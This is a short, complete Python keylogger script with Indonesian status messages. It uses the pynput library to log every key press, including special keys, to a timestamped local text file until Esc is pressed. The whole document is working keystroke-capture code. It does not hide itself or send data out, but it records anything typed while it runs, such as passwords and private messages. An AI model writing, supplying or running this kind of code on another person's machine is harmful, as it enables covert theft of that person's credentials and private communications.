from pynput.keyboard import Key, Listener
import logging
import os
import time

def get_log_file_name():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    return f'keylog_{timestamp}.txt'
log_file = get_log_file_name()
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')
def on_release(key):
    if key == Key.esc:
        return False 
with Listener(on_press=on_press, on_release=on_release) as listener:
    print(f'Keylogger berjalan... Menyimpan ke {log_file}')
    listener.join()

print('Keylogger dihentikan.')
